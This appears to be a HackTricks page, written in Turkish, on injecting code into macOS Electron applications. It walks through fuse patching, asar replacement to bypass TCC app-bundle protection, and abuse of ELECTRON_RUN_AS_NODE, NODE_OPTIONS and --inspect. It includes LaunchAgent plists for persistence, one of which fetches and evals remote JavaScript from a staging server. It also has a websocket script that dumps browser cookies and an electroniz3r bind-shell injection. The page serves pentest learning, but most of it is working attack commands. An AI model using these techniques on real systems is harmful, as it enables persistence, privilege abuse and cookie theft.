# macOS Electron Uygulamaları Enjeksiyonu

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) katılın veya [telegram grubuna](https://t.me/peass) katılın veya bizi Twitter'da** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Temel Bilgiler

Electron nedir bilmiyorsanız [**burada birçok bilgi bulabilirsiniz**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Ancak şu an için sadece şunu bilin ki Electron **node** çalıştırır.\
Ve node'un **başka kodları çalıştırmasına izin veren** bazı **parametreleri** ve **çevresel değişkenleri** vardır.

### Electron Sigortaları

Bu teknikler bir sonraki aşamada tartışılacak, ancak son zamanlarda Electron, bunları **önlemek için** birkaç **güvenlik bayrağı ekledi**. Bunlar [**Electron Sigortaları**](https://www.electronjs.org/docs/latest/tutorial/fuses) ve bunlar macOS'ta Electron uygulamalarının **keyfi kod yüklemesini önlemek** için kullanılanlar:

* **`RunAsNode`**: Devre dışı bırakıldığında, **kod enjekte etmek** için çevresel değişken **`ELECTRON_RUN_AS_NODE`** kullanımını engeller.
* **`EnableNodeCliInspectArguments`**: Devre dışı bırakıldığında, `--inspect`, `--inspect-brk` gibi parametreler dikkate alınmaz. Bu şekilde kod enjekte etmeyi önler.
* **`EnableEmbeddedAsarIntegrityValidation`**: Eğer etkinse, yüklenen **`asar`** **dosyası** macOS tarafından **doğrulanır**. Bu şekilde bu dosyanın içeriğini değiştirerek **kod enjeksiyonunu önler**.
* **`OnlyLoadAppFromAsar`**: Bu etkinse, **`app.asar`**, **`app`** ve son olarak **`default_app.asar`** sırasıyla aranmak yerine sadece app.asar'ı kontrol eder ve kullanır, böylece **`embeddedAsarIntegrityValidation`** sigortası ile birleştirildiğinde **doğrulanmamış kod yüklemenin imkansız** olduğunu garanti eder.
* **`LoadBrowserProcessSpecificV8Snapshot`**: Etkinse, tarayıcı işlemi V8 anlık görüntüsü için `browser_v8_context_snapshot.bin` adlı dosyayı kullanır.

Kod enjeksiyonunu önlemeyen başka ilginç bir sigorta da şudur:

* **EnableCookieEncryption**: Etkinse, diskteki çerez deposu işletim sistemi düzeyindeki şifreleme anahtarları kullanılarak şifrelenir.

### Electron Sigortalarını Kontrol Etme

Bu bayrakları bir uygulamadan kontrol edebilirsiniz:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Electron Sigortalarını Değiştirme

[Belgelerde belirtildiği gibi](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), **Electron Sigortalarının** yapılandırması genellikle **Electron ikili dosyası** içinde yapılandırılır ve içinde **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** dizesini içerir.

MacOS uygulamalarında bu genellikle `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework` içinde bulunur.
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Bu dosyayı [https://hexed.it/](https://hexed.it/) adresinde yükleyebilir ve önceki dizeyi arayabilirsiniz. Bu dizenin hemen sonrasında, her sigortanın devre dışı bırakılmış veya etkinleştirilmiş olduğunu belirten "0" veya "1" sayısını ASCII olarak görebilirsiniz. Sadece hex kodunu değiştirerek (`0x30` `0` ve `0x31` `1` olarak) **sigorta değerlerini değiştirebilirsiniz**.

<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

Uyarı: **`Electron Framework` ikili** dosyasını bu baytlar değiştirilmiş bir uygulamanın içine **üzerine yazmaya** çalışırsanız, uygulama çalışmayacaktır.

## Electron Uygulamalarına Kod Ekleyerek Uzaktan Kod Çalıştırma (RCE)

Bir Electron Uygulamasının kullandığı **harici JS/HTML dosyaları** olabilir, bu nedenle bir saldırgan, imzası kontrol edilmeyen bu dosyalara kod enjekte edebilir ve uygulamanın bağlamında keyfi kodları çalıştırabilir.

{% hint style="danger" %}
Ancak, şu anda 2 kısıtlama bulunmaktadır:

* Bir Uygulamayı değiştirmek için **`kTCCServiceSystemPolicyAppBundles`** iznine **ihtiyaç vardır**, bu nedenle varsayılan olarak bu artık mümkün değildir.
* Derlenmiş **`asap`** dosyasının genellikle **`embeddedAsarIntegrityValidation`** ve **`onlyLoadAppFromAsar`** füze değerleri `etkin` olarak ayarlıdır.

Bu saldırı yolunu daha karmaşık (veya imkansız) hale getirir.

{% endhint %}

**`kTCCServiceSystemPolicyAppBundles`** gereksinimini atlamak mümkündür, uygulamayı başka bir dizine (örneğin **`/tmp`**) kopyalayarak, klasörü **`app.app/Contents`**'ı **`app.app/NotCon`** olarak yeniden adlandırarak, **asar** dosyasını **zararlı** kodunuzla değiştirerek, tekrar **`app.app/Contents`** olarak adlandırarak ve çalıştırarak. 

Asar dosyasından kodu açabilirsiniz:
```bash
npx asar extract app.asar app-decomp
```
Ve değiştirdikten sonra tekrar paketleyin:
```bash
npx asar pack app-decomp app-new.asar
```
## `ELECTRON_RUN_AS_NODE` ile Uzaktan Kod Çalıştırma <a href="#electron_run_as_node" id="electron_run_as_node"></a>

[**Belgelere**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node) göre, bu çevre değişkeni ayarlandığında işlem normal bir Node.js işlemi olarak başlatılacaktır.

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Eğer **`RunAsNode`** anahtarı devre dışı bırakılmışsa, **`ELECTRON_RUN_AS_NODE`** ortam değişkeni görmezden gelinir ve bu çalışmaz.
{% endhint %}

### Uygulama Plist Dosyasından Enjeksiyon

[**Burada önerildiği gibi**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), bu ortam değişkenini bir plist dosyasında kötüye kullanarak kalıcılığı sürdürebilirsiniz:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## `NODE_OPTIONS` ile Uzaktan Kod Çalıştırma (RCE)

Payload'ı farklı bir dosyada saklayıp çalıştırabilirsiniz:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Eğer **`EnableNodeOptionsEnvironmentVariable`** kilidi **devre dışı bırakılmışsa**, uygulama başlatıldığında **NODE_OPTIONS** çevresel değişkenini **yoksayar**. Bu durum, **`ELECTRON_RUN_AS_NODE`** çevresel değişkeni ayarlanmadığı sürece **yoksayılacaktır**. Ancak, **`RunAsNode`** kilidi devre dışı bırakılmışsa, bu durum da **yoksayılacaktır**.

**`ELECTRON_RUN_AS_NODE`** ayarlamazsanız, şu **hata** ile karşılaşırsınız: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
{% endhint %}

### Uygulama Plist'ten Enjeksiyon

Bu çevresel değişkeni bir plist'te kötüye kullanarak kalıcılığı sürdürebilirsiniz, aşağıdaki anahtarları ekleyerek:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Denetim yaparak Uzaktan Kod Yürütme (RCE)

[**Bu**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) kaynağa göre, Electron uygulamasını **`--inspect`**, **`--inspect-brk`** ve **`--remote-debugging-port`** gibi bayraklarla çalıştırırsanız, bir **hata ayıklama bağlantı noktası açılacaktır** böylece ona bağlanabilirsiniz (örneğin Chrome'dan `chrome://inspect` üzerinden) ve **üzerine kod enjekte edebilirsiniz** veya hatta yeni işlemler başlatabilirsiniz.\
Örneğin:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Eğer **`EnableNodeCliInspectArguments`** füzyonu devre dışı bırakılmışsa, uygulama başlatıldığında **node parametrelerini** (örneğin `--inspect`) **ihmal edecektir**. Bu durum, **`ELECTRON_RUN_AS_NODE`** ortam değişkeni ayarlandığında dahi **ihmal edilecektir** ve bu füzyon da devre dışı bırakılmışsa.

Ancak, yine de **electron parametresi `--remote-debugging-port=9229`** kullanabilirsiniz ancak önceki yük işlemi diğer işlemleri yürütmek için çalışmayacaktır.
{% endhint %}

**`--remote-debugging-port=9222`** parametresini kullanarak Electron Uygulamasından **geçmiş** (GET komutları ile) veya tarayıcının içinde **şifrelenmiş** olan **çerezlerin** (çünkü tarayıcı içinde **şifrelenmiş** ve bunları verecek bir **json uç noktası** bulunmaktadır) bazı bilgileri çalmak mümkündür.

Bunu [**burada**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) ve [**burada**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) nasıl yapacağınızı öğrenebilir ve otomatik araç [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) veya basit bir betik kullanabilirsiniz:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
[**Bu blog yazısında**](https://hackerone.com/reports/1274695), bu hata ayıklama işlemi, başsız bir chrome'un **keyfi dosyaları keyfi konumlara indirmesini sağlamak için kötüye kullanılmıştır**.

### Uygulama Plist'ten Enjeksiyon

Bu çevresel değişkeni bir plist'te kötüye kullanabilir ve kalıcılığı sürdürmek için şu anahtarları ekleyebilirsiniz:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Eski Sürümleri Kullanarak TCC Atlatma

{% hint style="success" %}
macOS'taki TCC daemonı uygulamanın çalıştırılan sürümünü kontrol etmez. Dolayısıyla, **Electron uygulamasına kod enjekte edemezseniz** önceki tekniklerden herhangi biriyle, bir önceki sürümü indirip kod enjekte edebilirsiniz çünkü hala TCC ayrıcalıklarını alacaktır (Güven Önbelleği engellemezse).
{% endhint %}

## JS Olmayan Kodları Çalıştırma

Önceki teknikler size **Electron uygulamasının işlemi içinde JS kodunu çalıştırmanıza** izin verecektir. Ancak, **çocuk işlemler aynı kum havuzu profili altında çalışır** ve **TCC izinlerini miras alırlar**.\
Bu nedenle, örneğin kameraya veya mikrofona erişmek için ayrıcalıkları kötüye kullanmak istiyorsanız, sadece **işlemden başka bir ikili dosyayı çalıştırabilirsiniz**.

## Otomatik Enjeksiyon

[**electroniz3r**](https://github.com/r3ggi/electroniz3r) aracı, yüklü olan **savunmasız electron uygulamalarını bulmak** ve bunlara kod enjekte etmek için kolayca kullanılabilir. Bu araç, **`--inspect`** tekniğini kullanmaya çalışacaktır:

Kendiniz derlemeniz ve şu şekilde kullanmanız gerekmektedir:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Referanslar

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
